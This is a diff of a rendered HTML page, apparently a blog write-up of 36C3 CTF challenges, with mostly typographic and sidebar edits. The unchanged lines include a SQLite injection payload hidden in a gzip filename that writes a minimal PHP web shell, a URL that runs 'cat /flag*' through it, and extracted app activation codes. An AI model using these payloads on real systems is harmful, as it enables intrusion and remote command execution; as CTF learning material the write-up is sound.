@@ -89,7 +89,7 @@
 <script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
 
 
-<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.62.2" />
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.64.0" />
         
 
         
@@ -186,7 +186,7 @@
 <p><em>Ready for your hacking exam?</em></p>
 <hr>
 <p>As can be read above, <a href="https://play.google.com/store/apps/details?id=com.progressio.wildskills">an Android app</a> was given at the beginning of the challenge, with the hint to get a valid activation code for it.</p>
-<p>I've decided to just analyze it statically at first, so I've grabbed the <code>apk</code> from <a href="https://apkpure.com/wild-skills/com.progressio.wildskills/download?from=details">apkpure</a>. Then, I've decompiled it with <a href="https://github.com/Konloch/bytecode-viewer">BytecodeViewer</a>.</p>
+<p>I&rsquo;ve decided to just analyze it statically at first, so I&rsquo;ve grabbed the <code>apk</code> from <a href="https://apkpure.com/wild-skills/com.progressio.wildskills/download?from=details">apkpure</a>. Then, I&rsquo;ve decompiled it with <a href="https://github.com/Konloch/bytecode-viewer">BytecodeViewer</a>.</p>
 <p>Searching for the string <code>activat</code> in the whole application revealed the following method in the <code>MainActivity</code> class:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">activateApp</span><span style="color:#f92672">(</span>View var1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
     <span style="color:#66d9ef">int</span> var2<span style="color:#f92672">;</span>
@@ -229,7 +229,7 @@
     <span style="color:#f92672">}</span>
 <span style="color:#f92672">}</span>
 </code></pre></div><p>This printed <code>667518</code> as activation code.</p>
-<p>Connecting to the challenge service and submitting this value shows that in order to solve the challenge, more activation codes are required. The Android application manages some sort of courses, which can be activated individually. It's required to get an activation code for all courses to pass the challenge. Luckily, <code>MainActivity</code> has us covered again:</p>
+<p>Connecting to the challenge service and submitting this value shows that in order to solve the challenge, more activation codes are required. The Android application manages some sort of courses, which can be activated individually. It&rsquo;s required to get an activation code for all courses to pass the challenge. Luckily, <code>MainActivity</code> has us covered again:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">courseActivation</span><span style="color:#f92672">(</span>View var1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
     <span style="color:#f92672">[</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">]</span>
         <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>var4<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sgk258&#34;</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
@@ -307,13 +307,13 @@ bananaboiii
 <p>The initial approach was to check the filetype database of <a href="https://github.com/file/file/tree/master/magic/Magdir">GNU file</a> to find a file type that allows to control the output. The <code>Magdir</code> files in the link above use the placeholder <code>%s</code> exactly for this cause. While messing around with several files, it was found that <code>.tar.gz</code> files can be used for this:</p>
 <pre><code>$ file /tmp/yolo.tar.gz
 /tmp/yolo.tar.gz: gzip compressed data, was &quot;yolo.tar&quot;, last modified: Sat Dec 28 20:52:03 2019, from Unix, original size modulo 2^32 10240
-</code></pre><p>Uploading this file in the web application confirms that the <code>was &quot;yolo.tar&quot;</code> is also shown and therefore was also processed by the <code>$db-&gt;exec()</code> call. Let's grab your favorite hex editor and add a simple SQL injection POC right after the file name that's being displayed:</p>
+</code></pre><p>Uploading this file in the web application confirms that the <code>was &quot;yolo.tar&quot;</code> is also shown and therefore was also processed by the <code>$db-&gt;exec()</code> call. Let&rsquo;s grab your favorite hex editor and add a simple SQL injection POC right after the file name that&rsquo;s being displayed:</p>
 <p><img src="/img/36c3ctf/filemagic-hex.jpg" alt="Hex Hax"></p>
-<p>Now that it was confirmed to work, it's required to read the flag from the target. I've used a PHP web shell that was uploaded using this exploit. These are the database calls that were used and injected into the <code>.tar.gz</code> file:</p>
+<p>Now that it was confirmed to work, it&rsquo;s required to read the flag from the target. I&rsquo;ve used a PHP web shell that was uploaded using this exploit. These are the database calls that were used and injected into the <code>.tar.gz</code> file:</p>
 <pre><code>');ATTACH DATABASE 'x.php' AS lol; CREATE TABLE lol.pwn (dataz text);--
 ');ATTACH DATABASE 'x.php' AS lol; INSERT INTO lol.pwn (dataz) VALUES ('&lt;?=`$_GET[1]`?&gt;');--
 </code></pre><p>The payload was stolen from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">here</a> and modified.</p>
-<p>There are some restrictions regarding the embedded SQL payload: There's a size limit, so the payload was split into two separate files. One creates a new <code>.php</code> file and the other one writes a minimal PHP shell to it. A relative path (<code>x.php</code>) was chosen since this already points to a directory that's both writable and executable via a link.</p>
+<p>There are some restrictions regarding the embedded SQL payload: There&rsquo;s a size limit, so the payload was split into two separate files. One creates a new <code>.php</code> file and the other one writes a minimal PHP shell to it. A relative path (<code>x.php</code>) was chosen since this already points to a directory that&rsquo;s both writable and executable via a link.</p>
 <p>After that, visiting this link prints the flag:</p>
 <pre><code class="language-console" data-lang="console">http://78.47.152.131:8000/files/[dir]/x.php?1=cat%20/flag*`
 </code></pre><p>This is the output:</p>
@@ -340,7 +340,7 @@ bananaboiii
 </code></pre></div><p>The goal is to blindly catch all flag characters and assemble the flag from them afterwards. The layout of the map is not initially known to the player. Also, the flag characters move randomly after the player has taken some steps on the map. This effectively shuffles the flag characters over time and makes assembling the flag harder.</p>
 <p>While all of this can be done manually and from the game client GUI, the service speaks a very simple ASCII based protocol that can be accessed with <code>nc</code> or <code>pwntools</code>. Hence, the interaction with the game can be scripted.</p>
 <p>The fact that the flag characters are moving over time is quite interesting and allows catching all individual characters easily and in a scriptable manner. During tests it was found that there exists a long path on the map without any pits. By continuously walking left and right, the flag characters will eventually move into the path of the player and can therefore be caught.</p>
-<p>I've used this beautiful script for that:</p>
+<p>I&rsquo;ve used this beautiful script for that:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -431,7 +431,7 @@ doIt()
 <p><img src="/img/36c3ctf/dump.gif" alt="Catch The Flag"></p>
 <p>The flag characters therefore are:</p>
 <pre><code>hp0ctrw4_ax_n_0w{tg11tuhttny__0yc_3hd_d}nm
-</code></pre><p>There's only one issue: How to assemble the flag from this? I wasn't able to solve this during the CTF unfortunately :(
+</code></pre><p>There&rsquo;s only one issue: How to assemble the flag from this? I wasn&rsquo;t able to solve this during the CTF unfortunately :(
 Pls send help.</p>
 <p><em>Update: <a href="https://twitter.com/galli_leo_">@galli_leo_</a> managed to get the flag, as described <a href="https://ctftime.org/writeup/17873">here</a>. The characters move randomly - however the PRNG is seeded with</em> <code>time.time()</code>.</p>
 <p><em>Therefore the movement can be predicted :)</em></p>
@@ -447,6 +447,25 @@ Pls send help.</p>
     <h4 id="related" class="page-header">Related</h4>
 
      <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/gb-fuzz/">Fuzzing A GameBoy Emulator With AFL&#43;&#43;</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/fuzzing"><kbd class="item-tag">fuzzing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reversing"><kbd class="item-tag">reversing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+
+</div>
+  <div class="item">
 
     
     
@@ -489,31 +508,6 @@ Pls send help.</p>
     <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
     
     <a href="https://bananamafia.dev/tags/fuzzing"><kbd class="item-tag">fuzzing</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
-    
-
-</div>
-  <div class="item">
-
-    
-    
-    
-
-    
-
-    <h4><a href="/post/r2frida-1/">Dynamic Instrumentation: Frida And r2frida For Noobs</a></h4>
-    <h5></h5>
-    
-    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/frida"><kbd class="item-tag">frida</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/r2frida"><kbd class="item-tag">r2frida</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
     
     <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
     
